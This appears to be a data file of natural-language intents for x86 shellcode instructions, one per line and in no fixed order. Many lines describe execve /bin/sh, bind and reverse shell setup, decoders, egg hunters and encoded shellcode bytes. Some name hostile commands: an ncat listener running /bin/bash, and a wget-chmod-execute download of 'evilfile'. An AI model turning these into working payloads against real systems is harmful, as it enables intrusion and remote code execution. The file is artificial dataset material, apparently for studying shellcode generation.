load the effective address of [esi + 1] into the edi register
call kerel
loads 32-bit pointer from ebx to esp and fs register
zero out eax and ecx register
zero out eax register
push the esi onto the stack
ebx points the top of the stack
set syscall execve
perform a bound check to array index
add 3 to the contents of the esp register
perform an unconditional jump to _shellcode label
push the contents of esp register onto the stack
jump to the label check_html if the contents of the eax register is zero else jump to the while label
push eax and esp register on the stack
get 21 in the eax register
push the memory location of previous args onto the stack
push double word 0x74652f2f onto the stack and point the eax register to the stack register
decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label
tranfer the pointer to args from esp into ecx register
decrement esp
move 0xada67373 into edi
delcare download_label
declare the main_push label
move exit_call into al
add ebx to ecx
define the byte string ',ajm,pk#########'
rol decode with 1 offset
save stack pointer into ecx register
define search_the_egg label
declare section .text, global _start, _start:
system call sigaction
define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
move 0x3f into al
declare _user label
move 54 into al
decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero
load the effective address [zero_reg+3] into ebx
move 0x06 into al
xor between the current byte in esi and 0x88
jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register
push af_inet = 2 on stack
moves the memory address of esp(pointing to our string & nulls) from the stack into ebx
jump to the loop label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
pop the top of the stack into the eax register
specify file descriptor 1 standard output
load __nr_write into eax
jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register
move memory word_value to register bx
increment esi content
load sys_socket = 1 intp ebx
move dl into the address [ebx + 6]
increment ebx content then push it on stack
add ecx to edx
push af_inet =2 as a word
zero out the counter ecx register
push bx to the stack
define check_even_odd
add one to the doubleword integer stored at memory location tmp
shift left 28 bits of eax
edi points to the top of the stack
move the value 0x72702f2f into the double word starting at the address [esp-0x28]
move 0x31263e32 into eax
push "/bin/sh" on stack
move dl into bl
call kernel
getppid
get a pointer to the null value saving it in edx register
push 0x752f2f2f to the stack
load the stack pointer on edx register
copy the value 4755 into cx register
push pointer
subtract 8 value to esp content
invoke sys_close
move 0x01 into the byte at address [esp+3]
push the value 0x6374652f onto the stack and point edx to the stack register
push nulls for string termination
push 0x76766c2d onto the stack
mov 11 into lower byte of eax
push the 0x61702f63 onto the stack
push 0 on stack
load the effective address of the result of the operation [ebx+0xf] into the eax register
declare the duploop label
perform a logical xor between the address specified by [ecx + 116] and the dh register and save the result in [ecx + 116]
copy ecx content in edi register
push byte 2 onto the stack
push the double word eax content on stacck two times
move 102 into ax
define the _cmd label
restore ecx register
copy my_var contents in ax
subtract the byte value 0x1 from esp register and save the result in esp
check if we have found the egg. in case of negative response go to find_egg label else call esi
swap the contents of the eax register with the contents of the esi register
move al into the single byte at the address stored in edx+ecx
jump to the find_egg label if the contents of the esi register is equal to the contents of the edx register
divide eax by 2 using right shift
copy epb content into ecx register
moving 0 to edx
set resuid syscall 164 (0xa4)
push 's/co' on stack
declare the find_egg label
chain the register eax,edi, esi, ebx and load the contents on ecx register
clear ebx, setgid(0)
decrement the contents of the ecx register and jump to the _dup2_loop label if the result is not negative
move 0x01 into bl
push the zero_reg onto the stack
system call getpid
save al content into the space memory at the address ebx+35
push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register
perform an unconditional jump to _two label
load exit syscall into eax register
create variable b in memory and initialize to zero
make edi register point to xor_value
push sockfd (sock_file_des) onto stack
increment edi register
align page address
move the 3rd element of the array byte_table into cl
move 0x34399797 into esi
push the pointer to /bin/bash
push the dword 0x0501a8c0 onto the stack
jump short to the main label
perform a short unconditional jump to call_decoder label
system call sigaction
add 20 to the single byte stored at memory address var
define check_even_odd function
define the byte addr and initialize it to 0x1
move command into ebx
perform the xor operation between the value stored at the location ecx and bh
move the byte at the address [esi] into bl
load '/bin/cat/etc//paswd\0' into ex register
store the shellcode in esi
get the process ID
add 0x2 to al
push 0 on to stack (inaddr_any)
delcare shellcode_label
move 0x3 into bl
push the byte 0xc onto the stack
push in eax the argument no=0
pushes the old socket fd onto the stack
push ASCII /bin/sh onto the stack and point the edx register to the stack register
subtract 12 from esp register and save the result in esp
pop the top of the stack into the esi register
declare the bss section
jump to the exit_on_error label if the zero flag is cleared
push the byte +0x2 onto the stack
push the value 0x68732f2f onto the stack
declare next_page function
subtract 1564 from the contents of ax register and save the result in ax
move the contents at memory address temp3 to ecx
push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register
define the _return label
write to the file
declare the execfile label
jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register
define shift_decode label
jump to _decoder label after entering _encodedshellcode (db db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87) on the top of the stack
define _dup2_loop label
restore the top of the stack into the dx register
pick up ecx register from the stack
init ebx 0
compare if edi is equal to 0
move 4 into al
push the 0x2f2f2f6e onto the stack
load the effective address of the operation [bp+di+0x32] into the cx register
subtract 1662 from the contents of ax register and save the result in ax
push the word 0x692d onto the stack
shift right bx by the contents of dl and negate the byte in bx
define the _start label and jump short to the call_shellcode
decrement the ebx register by one
swap the values of esi and ebx
jump short to _load_data label
move the word at the address edi+1+ecx into ax
decrement ecx
push the 0x5 onto the stack
perform a short unconditional jump to _four label
clear ecx and eax
push the byte 0x17 onto the stack
set the direction flag to zero
perform a short jump to enc_label
push 0x0 onto the stack
move al into the byte at address [esi+11]
push 0x81e3a8c0 onto the stack
push byte 0x2 adn esi content on stack
move the contents of the eax into the double word starting at the address [esp-0x4]
push the word 21 onto the stack and point ebx to the stack register
push 0x65782e2f onto the stack
_start
make the system call exit
move 123 into the effective address saved in ebx
define _decode label
mov ip address in ecx
perform or operation between al and bl registers
declare odd_numer function
define number variable of a word and initialize to 12345
negate the byte at the address edi after subtracting the value 7
load the pointer to struct into ecx register
push the value 0x3d4c4c41 onto the stack
put 0-term and the word 99n- on stack
move the memory address of contents string into ecx
move the contents at the address stored in esi into the ax register
load __nr_dup2 into al register
push the value 0x0, ecx and ebx contents on stack
clean the eax register and move the next byte of the shellcode into the lower byte of the register
jump short to the decode_pr label
declare _shell as global label
_start label
load the byte pointed by esi in al
reserve 1 word for variableName2
subtract ah from al
move ecx to edi for scasd operation
push the value 0x6475732f and the value 0x6374652f onto the stack and point the edx register to the stack register
declare a word uninitialized value referred to as location x
jump to next_addr if not zero
push 0x79616c70 to the stack
invoke sys_open
put the syscall 10 into the eax register
define _cmd label
point ebx to the next byte of the shellcode
if efault page alignment
load address of ptr to argv[] array into ecx register
decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register
move the command socketcall = 102 into eax register
envp = 0
declare retry label
push 16, *ptr and file descriptor on stack
push null terminated string '/bin//sh' on stack
execute execve syscall
move 3 into cl
copy the contents of dl into al
push 16 onto the stack
make the system call to set set signal delivery alarm clock
move the contents at memory address x to ecx
initiliaze eax to 0
push 0x6f635f64 onto the stack
pop the value on the stack back into cx
perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi]
jump short to the memory location loc_40102B if the contents of the eax register is not equal to the contents of the ebp register
jump short to the end label
push address of string print_msg
retrieve a valid address saving it into eax
push port number 5555 (little-endian)
make the system call close
push '//sh' on stack
perform an unconditional jump to insertion_decoder label
jump short to the _start label
put syscall value into eax
wait for child to terminate
push the value of port 1336 on 32 bit on stack
load chained null and the arg /bin//nc into ebx register
push the contents of the esi register onto the stack and point edx to the stack register
decrement the contents of the ecx register and jump to the dup2loop label if the result is not negative
if the zero flag is clear jump to decode insertion label
define the doubleword arr and initialize it to 50
save the socket descriptor stored in eax in ebx
save pointer into ecx
move 132 to eax 132
push the dword 0x58494741 onto the stack
obtain the address of the first instruction of the shellcode alias the entry mem addr of this code (_start) and then pop it in esi
execute __nr_execve syscall
clear ecx and save the number of loops, 3, in it
save the address 127.1.1.1, the value on 32bit 4444 and af_inet represented in 32bit on ecx register
define stage and call decoder function
load syscall for socketcall() 102 into al register
move ecx into the doubleword starting at the address esp-4
copy the value in var1 into the doubleword starting at the address in eax
move 0x191 into cx
make the system call to read the file
move 12 into al
move 8bytes of "rot_value" to mm2
move number 9 into ebx
add 4 to esi
declare the read label
oring the double word at the address edx-0x557f5533 wth ebp content
right shift the contents of the edi register by the contents of the cl register
load 1 into al register
push the dword 0x72657355 onto the stack
move the byte in eax into cl
load exit syscall number into eac register
execute execve with system call interrupt
save 0x0a into dl to have bad line feed char
execute decoded shellcode
in D4 store the shellcode in edi and move the pointer into esi
incement eax register by 1
if the contents of the eax register is not zero then jump short to the label _parent
decrement the count register and jump to check_even_odd if the count is not equal to zero
push the word 0x6666 onto the stack
as long as sf is not set, jump to _dup2_loop label
jump to the exit label if the destination operand is greater than the source operand in the above comparison
move readlen into edx
run no operation
load the stack pointer into esi register
push the word 1 onto the stack and point eax to the stack register
decrement ecx by 1
subtract the hexadecimal value 0x2e2aa163 to ebx content, then push it on stack
push the byte 0x1 to the stack
declare F2, negate bl and move bl to the next byte
clear the edi register
push edx and edi on stack
if it is less than or equal to 10 then jump to lp1
declare _decoder label
push 0x3d4c4c41 onto the stack
load null terminated string 'sbin/reboot' into ebx register
move to the next word of the shellcode
perform xor between dl and 0xbb and jump to next_cycle if the result is zero
push edi content, the buffer size = 100 as a word, edi content and socketfd (esi) on stack
save the pointer to args in ecx
move key into eax
copy the code of the syscall exit into al reegister
decrement the count register and jump to _decrypt if not equal zero
perform xor operation between eax register and esi register and store the result in eax
save pointer to ecx
copy the code of the syscall read into al register
make the system call mmap
declare a byte with no label containing the value 10
no operation
swap the values of ebx and eax registers
set the sockaddr size, 0x16, onto the stack
add edx to eax
jump to the label _parent if the contents of the eax register is not zero else restore the top of the stack into the ecx register
declare an uninitialized byte labeled var2
define the _appendfile label
compare the dword at the address [eax-8] and egg
clear ebx and eax register
move the contents of the address [ebp+12] into ecx
push the word 17 onto the stack and point edx to the stack register
exchange eax content with ecx content
move the value 20 into bx
moving the pointer to "/bin//sh" to ebx
jump to the exit label if the unsigned contents of the ebx register is greater than the unsigned value 10 else jump to the loop label
add 01 to ax
move the contents of src variable into edx
define set_mark label
push 0x6168732f onto the stack
global _start
jump to the encrypt label
push the word 0x6873 onto the stack
load string into rbx register
jump short to the callme label
push '//sh' on stack
if the contents of the cl register is not equal to the value 0x3 then jump to the loop label
decrement the counter and jump to decode if not zero else jump to edx
move the the contents of the bl register into the byte starting at the address in edi
define the _params label
jump to the label l1 if the contents of the al register is greater than the decimal value 9
cleaning eax, ebx, edx and edi registers
move the value 0x4 into the al register
push the 0x2f656c2d onto the stack
increment edi register by 1
multiply ecx by 2 using left shift
jump to the exit label if the operands of the above comparison are equals
encoder_shellcode is the array of bytes 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa
declare the init label
move the contents of the address [ebp-4] into the ebx register
move the byte at the address 0bh into al
pop doublewords from the stack into the general purpose registers
jump short to the label socket if the contents of the eax register is negative
push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register
push the 0x68732f2f value onto the stack
move 0x2 into cl
push the byte 8 onto the stack
jump to shellcode_label after entering the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd' on the top of the stack
push 'enre' label on stack
call the _exec function
left rotate the shellcode by one
load the pointer to the struct into ecx register
declare the write label
load '/bin//sh\0' into ebx register
move the byte at the address [eax] into cl
execute execve
jump short to decode
move 0x563ed8b7 into eax
push the contents of the edx register onto the stack and point ebx to the stack register
add 3 to the contents of esp
jump to the next_addr label if the operands of the above comparison are not equals
jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register
push 0 (=eax)
load ':0' into dx register
push the string '/bin/zsh' on stack
backup ecx into ebx
subtract the value 1 from the contents of the cl register and jump to the decode label if the result is not zero
syscall for sigaction()
ror decode with 1 offset
declare the len label equal to the size of the google variable
null terminate -lvp1337
declare F2 and point to the next byte in esi
perform the xor between the byte in esi and dl
load the effective address [ebp+39] into ebx
add 4 to the esp register
subtract 0x04baca01 from the contents in ecx and save the result in ecx
define writestring function
push edx, ecx, ebx, eax, esp, ebp, esi and edi registers on the stack
read the file
declare the one label
push the contents of the esi register onto the stack
push the contents of the ebx register onto the stack and point edx to the stack register
put 769 in cx
jump to the _next label if the operands of the above comparison are not equals
restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit
if the contents of the al register is equal to the value 0xf2 then jump to the _start label
declare the exit label
clear the ebx register and push its contents onto the stack
move _start into eax
decrease the counter and jump to decode if not zero else jump short to shellcode
move the client socket fd from edx into ebx
zero out ebx, eax and edx
if the contents of the eax register is zero then jump to the label write else zero out the contents of the eax register
push the 0x6d722f2f onto the stack
restore the top of the stack into the edi register
execute nanosleep
subtract the byte at the address esi from the contents of the dl register
move al into the byte at address [esi+7]
zero out edx register and save af_inet, sock_stream and edx contents in ecx
copy esp content into ecx and edx registers
load the stack pointer into ebx register
define the call_decoder label and call the decoder function
jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
load the byte 2 into edx register
jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero
if the carry flag or the zero flag are set set go to the address at _end+0x1d
define stage label
load syscall execve number into al register
move m_src2 to ebx
clear eax
push 0-term, the args in edi, the args in esi and the pointer to /user////bin/head on the stack
subtract hexadecimal value 0x6374612e to ecx content
push the word 0x632d onto the stack and point the ebx register to the stack register
define string as the byte string 'file1.txt'
jump to the shellcode label
move eax into ebx
if the unsigned contents of the al register is greater than the unsigned contents of the bl register then jump to the l2 label else add the value 3 to the eax register
move 0x169 into ax
xor to clear out ecx
move 0x50905090 into eax
mask out lowest 4 bits of the edx register
if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the while label else jump to the eax register
push 0x46 onto the stack
add the byte in edi to the al register
clearing the eax, ebx, ecx, edx registers
save esi content into ebx
next word in the edx
push af_inet = 2
restore the original value of ebx
declare the global _start label
push 0x68736164 to the stack
push the dword 0x6164732f onto the stack
push 0-term, gifn, oc_d, hss/, hss/, cte/ on the stack
move 0x16b into ax
push '///b' on stack
move to the next double word in the ebx register
push '/bin//sh on stack'
move 39 into al
perform the xor operation between the al register and the value 0x30
move dl into the byte in eax
push 0x61702f2f onto the stack
push 0x0a4c4c41 onto the stack
push -c param on the stack
load __nr_write into al register
multiply eax by the contents of the edx register
push the byte 15 onto the stack
put the byte at the address esi+1+ebp into al
define the byte string '70h'
clear all but the last 4 bits of eax
move the contents of memory address array+esi*4 into eax
allocate one byte of memory for var_b variable and initialize it to 'c'
move donelen into edx
perform an unconditional short jump to read label
load dup2 syscall numbere into eax register
push the value 0x29 to the stack
push port value 4444 as word on stack
define _loop_label
load esp cpntent into edx register
save the address of the shellcode in esi
clear ecx and push ints content on stack
store address of -e/bin/bash in cccc taken from ebx
push 16, ecx and esi on the stack
define _execline label
move ecx to edx
right shift the contents of eax by 23 bits
save stack pointer to ebx
push word af_inet6
zero out ecx register
extract esi from the stack
declare the l00p label
decrement ecx by 1 and jump to the dup2loop procedure until ecx equals 0
define write_label
put the contents of the al into the cl register
push 0x7369642d onto the stack
define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
move the contents of the bx register at the memory location specified by the operation [bp+0x3a]
push '/bin//sh' string on stack
push byte 6 onto the stack
push the value 0x6e7a762d onto the stack and point the ebx register to the stack register
invoke subroutine connect
load hexadecimal value 0x1ff9090 into ecx
move readbuffer into edx
in F2 point to the next byte of the eax register and jump to label L2
push null terminated string 'hack' on stack
add 0x12345678 to the contents in eax and save the result in eax
move to the next word in the ecx
decrement the counter
decrease ebp
in the function F1 point to the next byte of the edi and jump short to L1
move the address of the character on the stack into ebx
define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a
increment ebx by 1
jump to the shellcode label if the contents of the bl register is equal to the value 0xaa
jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label
move the byte 0eh into bl
go to _zero7 label
define the doubleword variable big_number and initialize it to 123456789
push host_sockfd
execute setsid
move 0x16a into ax
transfer the value 48 in the memory variable total
increment edx register by 1
push 2 on stack as a word
subtract 0x0efc3532 from the contents in eax and save the result in eax
push the 20 onto the stack
negate all the bits of the edi register
subtract 5d455523 from the contents of the eax register
jump short to 0x2c
define _dup2 label
push /bin/sh onto the stack and point the ecx register to the stack register
decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack
move 4 to the eax register
move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero
store 4 into al
jump to the numeric label 1 if the zero flag is cleared
make room for one 4-byte local variable
define read_file_label
declare global _start, section .text, sys_execve = 0x0b and_start label
move 0x1e into cl
initialize ecx to zero
move 0x09 into dl
push 0x2f2f2f2f to the stack
push the contents of the cx register onto the stack
load sys_dup2 into al register
left shift the contents of the esi register by 0x1 bit
add 0x25 to the al register
xor encoded_shellcode with 1337, one word at a time
push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ecx register to the stack register
compare hexadecimal value 0xf3ab0aba with eax
restore esi from the stack
compare the byte at the memory location buff with 61h
jump short to shellcode
copy the hexadecimal value 0x35 in dh register
load the effective address [ebp-8] into ebx
store sockfd from eax in ebx
invoke sys_lseek
move cl into al
move len into cl
set edx to next 16 byte block
compare if our counter is equal to 100
in L1 call the stack
call the loader function
copy 21 into cl register
push 0x636e2f2f to the stack
move 0x7 into al
push the 0x636e2f2f onto the stack
save 0 and socket file descriptor in ecx
move the number of the syscall write in al register
in shellcode_section go to decoder's main
add ebx content to edx
move the byte at address eax to dl
signal
if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D
declare the enc label
push syscall for socketcall() 102
move 0xd2c45e5e into esi
set the port to bind on, in reverse order is 4444
jump to 0x8 if zero
put the syscall 54 into the eax register
if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label
negate all bits of th souble word stored at the address esi+0x73
transfer esp content to ebx
load the effective address of the result of the operation [ecx+4] into the eax register
compare eax with the egg_sig, if not compare jump to search_the_egg
set the 1st arg /bin/bash from the stack
make the system call to wait for child for terminate
define the array of bytes encodedshellcode and initialize it to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
decoder function
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label
push the value 0x64687373 onto the stack and point the eax register to the stack register
define one_label
run pxor operation between mm0 and mm1
jump to decoded if zero
reset edx to 0
push af_inet = 2 on stack
perform a short and unconditional jump to _execline label
perform a short unconditional jump to shellcode
push sock_reg onto the stack
subtract the contents of eax from the contents of eax
clear ecx and eax register
jump short to exi label
exchange eax and edx content
move the return value of sys_socketcall into edi
add 1 to ebx and jump to L1 if the result is not zero
exit with return code of 0
open the file
go to _zero12 label
define the byte string '0',10
load the stack pointer into edx register
push the 0x66 onto the stack
jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7 else subtract the byte value 0x7 from byte starting at the address contained in the esi register
jump short to the _cmd label
push ebx two times andesi contents on stack
jump to decoder1_label afetr entering xor_value, rot_value and shellcode on the top pf the stack
move edi into the doubleword starting at the address esp-8
load esp content into ebx
push 0x10 onto the stack
jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register
jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7
shift right 28 of eax
move 102 into al
move the character x from ebx register to ecx register
save the byte in esi+edx+2 in bh
make syscall for socketcall()
in the negative function negate dl and increment dl to the next byte
define main_loop label
go to _zeroe label
push ebp onto the stack
push on stack the arguemnts ip_proto = 0, sock_stream =1, pf_inet6 = 10
increment esi and edi register
left rotate the byte in esi 2 times
define call_decoder
swap the values of edx and ebx registers
define formatting label
move the byte at the address [eax] into bl
call the doit function
move the byte at the address 0ffh into dl
go to _zero1b label
define _zero15 label
push null byte on stack
push the word bx to the stack
push 0x68736162 onto the stack
move buff to ecx
push the dword 0x6374652f onto the stack
move buff to ebx
move 0x2e383631 into eax
subtract hexadecimal value 0x54 to al register
transfer the hexadecimal value 0xada67373 into edi register
define the _egg label
push the word [edx] to the stack
push the word 0x632d onto the stack
push 0xf onto the stack
define string as the byte string 'test.txt'
push esi content on stack
system call close
push the byte 2 onto the stack
perform a short unconditional jump to _three label
point to the next position in ecx
define _cmd label
subtract 0x7f from esp
move the 64 bit of edi into mm0 64bit register
push the esp onto the stack
compare if ecx is equal to 10
push 0x6374652f onto the stack
decrement cl register
load the socket file desriptor from eax into esi register
declare global start, section .text and _start label
execute execve syscall
load into ecx the pointer to args stored in esp
perform the xor between cl and the byte in esi+edx
push '-f' on stack
push protocol ipv6 value, 6, on stack
move bind syscall number in ax register
transfer esi content into al register
define the array of bytes shellcode and initialize it to 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
push null on the stack
declare _close label
save the returned value of the previous sys call (fd) into ebx, 2nd arg
load the string //sh into edi register
define _output string
jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi
declare F3 function and point to the next word in edi
transfer the byte in the address esi to bl register
push '//pa' onto the stack
put the byte in the address esi+13 in edi register.
add 2 to al register
push sockfd (esx) on stack
preserve edx on the stack
decrement the contents of the cl register
negate all the bits of ax register
jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register
push '////' on stack
define the decode function and negate the byte in esi
divide the contents of eax by the word value stored at memory location value
decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label
define the doubleword variable real_number1 and initialize to 1234
zero out the ebx register
push 0xb onto the stack
pop the last element pushed onto the stack into bx
move the byte 0bh into al
define encoded as array of words 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539
compare the dword at the address [eax-4] and egg1
backup ebx into eax
load eax content into ebx register
push current socket fd onto the stack
if zero jump to the child label
move 20 into al
load esp content into edi register
declare _start label
load null terminate string '/bin/das' into ebx register
declare L2 label and call the function pointed by the stack
move 0xa4 into the byte in al
jump to the _exec label after entering the address of the string ""/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile", 0x0a" at the top of the stack
move 0x1ff into cx
test the value of the al register
push 0x78534a52 onto the stack
subtract 1634 from the contents of bx register and save the result in bx
decrement the contents of the eax register
pop the top element of the stack into edi
define the shellcode 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa
declare section text
move eax register to ebx register then push eax on the register
declare the doit label
load __nr_exit syscall number into al register
call the shellcode function
as long as sf iss not set, jump to _dup2 label
compare if ebx is zero
put the syscall 28 into the eax register
push 0x4f4e2029 onto the stack
jump to the label _close if the zero flag is set
loast stcak pointer into ebx register
define the call_write label
jump to ecx
move the value $0x09 into dl
move 0x14 into bl
push null terminated /bin//sh on stack
if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register
transfer ebx to eax
copy eax content in esi register
compare if edx is zero
push ipproto_ip = 0 (eax) on stack
push hs// string on stack
copy hexadecimal value 0xff in dl register
zero out eax and ebx
push the byte 0x5 onto the stack and point edx to the stack register
anding the double word at the adress eax-0x7 and ecx register
push the double word 0x2335738c onto the stack
subtract one from the contents of eax
subtract 13 to esi content
get 18 in the bx register
push the value 4444 of the port on stack
move 0x11 into the byte at address [esp+3]
move the contents of memory address esi+ecx into bl
move 32 into cl
perform xor operation between eax register and ebx register and store the result in eax
subtract the contents of al register from the contents of bl register and save the result in bl
push the 0x6e onto the stack
push the word 0x3582 onto the stack
save fd in ebx
move the contents at memory address temp2 to ebx
push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the edx register to the stack register
jump short to cycle label
go to _zerp1e label
decrement cl content by 1
save esp content into edx
subtract the hexadecimal value 0x44444444 from edi content
push the word 0x662d onto the stack and point the edx register to the stack register
perform an unconditional jump to _call_write label
put the syscall 17h into the eax register
transfers string element addressed by esi register into al register
pop the top element of the stack into memory at the four bytes starting at location eax
move the value of upcase into ebx
move value of memory address [ebp+8] into eax
save the argument array into ecx register
save addr ptr into ecx
move the value 0x5 into the bl register
push the string /bin//sh\0\0\0\0\0\0\0\0 on the stack and place pointer to eb
clear edx adn push null terminating string on stack
define two label
push '//sh' on stack
put the syscall 70 into the eax register
load the string //bin/sh\0 into ebx register
push 0x1 to the stack
load execve syscall into al register
define F5 and call the function function_5
decrement edi register
push the string //proc/sys/kernel/randomize_va_space on the stack and then load the stack pointer on ebx register
xoring hexadecimal value 0xaa wih bl register
0's out eax and ebx
copy the dl content into bl register
move /bin/sh into the ecx register
declare call_shellcode_label
increment the offset (esi content)
move bl into byte edx+eax
make ecx pointing to args
push eax contents on the stack
jump short to the _parent label if the zero flag is cleared
clear the edx register and push its contents onto the stack
push the value 0x6374652f onto the stack and point ebx to the stack register
jump to the entrypoint label
define string as the byte string 'tmp.txt'
zero out eax ecx register
system call execve
if no match go to incaddr
increment esi content two times
push 0x782f2f32 to the stack
push the value of register eax onto the stack
left shift the contents of eax register by 28 bit positions
increment dl
zero out esi content
push protocol id = 0
clear the edx register
clear eax and ebx registers
define the word value word_value and initialize it to 300
in next_cycle increment edi by one and jump short to formatting
left rotate the contents of the edi register by 1 bit
add 2 to edi
push 0x2e323931 to the stack
point ecx to the top of the stack
copy the address of esi into edi register
put the syscall 0x43 into the eax register
zero out edx and move 0x3 in the lowest byte of the register
move the string /bin//sh on ebx register
define sys_socket 1
define decoded_shellcode function
clear the ebx register and move the next byte of the shellcode into the lower byte of the register
perform a short unconditional jump to output label
push edx register on the stack
push the ebp onto the stack
